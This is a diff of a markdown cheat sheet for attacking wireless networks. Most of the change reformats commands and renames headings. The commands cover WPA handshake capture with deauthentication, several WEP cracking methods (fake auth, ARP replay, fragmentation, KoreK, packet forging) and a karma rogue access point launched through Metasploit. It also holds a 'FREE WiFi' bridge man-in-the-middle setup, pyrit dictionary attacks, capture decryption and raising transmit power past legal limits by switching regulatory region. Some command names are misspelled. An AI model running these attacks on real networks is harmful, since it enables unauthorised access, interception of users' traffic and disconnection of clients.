@@ -22,28 +22,29 @@ You must choose a wireless module that has a chipset that is capable of being pu
 
 ## **Setting TX POWER**
 
-iw reg set BO  
-iwconfig wlan1 txpower 25
+`iw reg set BO`  
+`iwconfig wlan1 txpower 25`
 
 ## **Cracking WPA**
 
-airmon-ng start wlan0  
-airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
-aireplay-ng -0 1 -a \(AP MAC\) -c \(VIC CLIENT\) wlan0mon {disassociation attack}  
-aircrack-ng -0 -w \(wordlist path\) \(caputure filename\)
+`airmon-ng start wlan0`  
+`airodump-ng -c <channel#> –bssid <AP_MAC> -w <out_file> wlan0mon`  
+`aireplay-ng -0 1 -a <AP_MAC> -c <victim_client> wlan0mon` {deauth attack}  
+`aircrack-ng -0 -w <wordlist> <capture_file>`
 
-## **Cracking WEP with Connected Clients**
+## **Cracking WEP**
 
-airmon-ng start wlan0 \( channel\)  
-airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
-aireplay-ng -1 0 -e \(ESSID\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication}  
-aireplay-ng -0 1 -a \(AP MAC\) -c \(VIC CLIENT\) wlan0mon {disassociation attack}  
-aireplay-ng -3 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon {ARP replay attack}
+###  **with Connected Clients**
 
-## **Cracking WEP via a Client**
+`airmon-ng start wlan0 [channel#]`  
+`airodump-ng -c <channel#> –bssid <AP_MAC> -w <out_file> wlan0mon`  
+`aireplay-ng -1 0 -e <ESSID> -a <AP_MAC> -h <Host_MAC> wlan0mon` {fake authentication}  
+`aireplay-ng -3 -b <AP_MAC> -h <host_MAC> wlan0mon` {ARP replay attack}`aireplay-ng -0 1 -a <AP MAC> -c <victim_client> wlan0mon` {deauth attack - as needed}
 
-airmon-ng start wlan0 \(channel\)  
-airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
+### **via a Client**
+
+`airmon-ng start wlan0 [channel#]`  
+`airodump-ng -c <channel#> –bssid <AP_MAC> -w <out_file> wlan0mon`  
 aireplay-ng -1 0 -e \(ESSID\) -a \(AP MAC\) -h \(OUR MAC\) wlan0mon {fake authentication}  
 aireplay-ng -2 -b \(AP MAC\) -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon  
 aireplay-ng -2 -r \(replay cap file\) wlan0mon {inject using cap file}  
@@ -55,12 +56,12 @@ airmon-ng start wlan0 \( channel\)
 airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
 aireplay-ng -1 500 -q 8 -a \(AP MAC\) wlan0mon  
 areplay-ng -5 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon  
-packetforge-ng -0 -a \(AP MAC\) -h \(OUR MAC\) -k 255.255.255.255 -l 255.255.255.255 -y \(FRAGMENT.xor\) -w \(filename.cap\)  
+packetforge-ng -0 -a \(AP MAC\) -h \(OUR MAC\) -k 255.255.255.255 -l 255.255.255.255 -y \(FRAGMENT.xor\)   -w \(filename.cap\)  
 tcpdump -n -vvv -e -s0 -r \(replay\_dec.\#\#\#\#\#.cap\)  
 packetforge-ng -0 -a \(AP MAC\) -h \(OUR MAC\) -k \(destination IP\) -l \(source IP\) -y \(FRAGMENT.xor\) -w \(filename.cap\)  
 aireplay-ng -2 -r \(filename.cap\) wlan0mon
 
-## **Cracking WEP /w shared key AUTH**
+### **Cracking WEP /w shared key AUTH**
 
 airmon-ng start wlan0 \( channel\)  
 airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
@@ -71,9 +72,9 @@ aireplay-ng -3 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon {ARP replay attack}
 aireplay-ng -0 1 -a \(AP MAC\) -c \(VIC CLIENT\) wlan0mon {deauthentication attack}  
 aircrack-ng -0 -z\(PTW\) -n 64\(64bit\) filename.cap
 
-## **Cracking a Clientless WEP \(FRAG AND KOREK\)**
+### **Cracking a Clientless WEP \(FRAG AND KOREK\)**
 
-### _{FRAG}_
+#### _{FRAG}_
 
 airmon-ng start wlan0 \(channel\)  
 airodump-ng -c \(channel\) –bssid \(AP MAC\) -w \(filename\) wlan0mon  
@@ -83,7 +84,7 @@ packetforge-ng -0 -a \(APMAC\) -h \(OUR MAC\) -l 255.255.255.255 -k 255.255.255.
 tcpdump -n -vvv -e -s0 -r filename.cap {TEST}  
 aireplay-ng -2 -r filename.cap wlan0mon
 
-### _{KOREK}_
+#### _{KOREK}_
 
 ~aireplay-ng -4 -b \(AP MAC\) -h \(OUR MAC\) wlan0mon  
 tcpdump -s 0 -s -e -r replayfilename.cap  
@@ -104,7 +105,9 @@ chown dhcpd:dhcpd /tmp/dhcp.log
 dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmp/dhcp.log at0  
 msfconsole -r /root/karma.rc
 
-#### **Bridge CTRL man in the middle SETUP**
+## **MISC**
+
+### **Bridge-control man in the middle**
 
 airebase-ng -c 3 -e “FREE WiFi” wlan0mon  
 brctl addbr hacker\(interface name\)  
@@ -116,7 +119,7 @@ ifconfig hacker 192.168.1.8 up
 ifconfig hacker  
 echo 1 &gt; /proc/sys/net/ipv4/ip\_forward
 
-#### **pyrit DB attacks**
+### **pyrit DB attacks**
 
 pyrit eval  
 pyrit -i \(wordlist\) import\_passwords  
@@ -130,14 +133,14 @@ pyrit -r \(capturefile\) -o \(capturefile output\) strip
 **pyrit dictionary attack**  
 pyrit -r \(capturefile\) -i \(/pathtowordlist\) -b \(AP MAC\) attack\_passthrough
 
-#### **airgraph-ng**
+### **airgraph-ng**
 
 airgraph-ng -i filename.csv -g CAPR -o outputfilename.png  
 eog outputfilename.png  
 airgraph-ng -i filename.csv -g CPG -o outputfilename.png  
 eog outputfilename.png
 
-#### **airdecap-ng**
+### **airdecap-ng**
 
 airdecap-ng -b \(vic ap\) outputfilename.cap  
 wireshark outputfilename.cap  
